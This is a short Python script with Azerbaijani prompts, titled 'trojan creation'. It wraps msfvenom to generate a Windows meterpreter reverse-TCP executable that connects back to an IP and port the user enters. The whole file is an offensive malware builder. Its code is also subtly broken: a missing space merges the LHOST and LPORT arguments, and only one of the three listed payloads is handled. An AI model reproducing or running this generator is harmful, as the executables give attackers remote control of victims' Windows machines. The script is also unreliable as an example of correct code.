#!/usr/bin/env python
import os
os.system ("apt-get install figlet")
os.system ("clear")
os.system ("figlet TROJAN YARATMA ")

print("""
TROJAN YARATMA PROGRAMINA XOS GELMISINIZ :) 
""")
ip=input("local ve ya xarici ip addressi yazin :")
port = input("port yazin ")

print(""" 
1)windows/meterpreter/reverse_tcp
2)windows/meterpreter/reverse_http
3)windows/meterpreter/reverse_https

""")
payload = input ("payload no yazin :")
qeydiyyat_yeri =input("qeydiyyat yeri yazin :")

if (payload == "1"):
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+ "LPORT="+port+" -f exe -o "+ qeydiyyat_yeri)